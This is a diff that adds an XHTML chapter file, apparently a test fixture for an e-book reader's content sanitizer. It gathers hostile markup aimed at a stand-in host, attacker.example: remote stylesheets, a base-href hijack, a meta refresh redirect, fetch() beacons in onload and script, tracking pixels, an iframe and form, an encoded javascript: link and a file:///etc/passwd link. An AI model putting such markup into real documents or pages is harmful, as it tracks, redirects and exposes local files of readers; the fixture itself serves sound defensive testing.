@@ -1,0 +1,37 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <base href="https://attacker.example/" />
+    <link rel="stylesheet" href="https://attacker.example/remote.css" />
+    <link rel="stylesheet" href="styles/book.css" />
+    <meta http-equiv="refresh" content="0;url=https://attacker.example/redirect" />
+    <style>
+      @import url('https://attacker.example/remote.css');
+      body {
+        background-image: url('../Images/paper.png');
+      }
+      .remote {
+        background-image: url(//attacker.example/pixel);
+      }
+    </style>
+  </head>
+  <body onload="fetch('https://attacker.example/beacon')">
+    <script>
+      fetch('https://attacker.example/script');
+    </script>
+    <iframe src="https://attacker.example/frame" />
+    <form action="https://attacker.example/submit" />
+    <a id="internal" href="chapter-2.xhtml#section">Continue</a>
+    <a id="fragment" href="#section">Section</a>
+    <a id="remote" href="HTTPS://attacker.example/leave">Remote</a>
+    <a id="encoded" href="java%73cript:alert(1)">Encoded</a>
+    <a id="scheme-relative" href="//attacker.example/leave">Scheme relative</a>
+    <a id="file" href="file:///etc/passwd">File</a>
+    <a id="malformed" href="%E0%A4%A">Malformed</a>
+    <img id="local-image" src="../Images/cover.jpg" />
+    <img id="embedded-image" src="data:image/png;base64,iVBORw0KGgo=" />
+    <img id="remote-image" src="https://attacker.example/pixel" />
+    <img id="remote-srcset" srcset="https://attacker.example/a.jpg 1x, ../Images/a.jpg 2x" />
+    <svg><image id="remote-svg-image" href="https://attacker.example/image" /></svg>
+    <video id="remote-video" poster="https://attacker.example/poster" />
+  </body>
+</html>
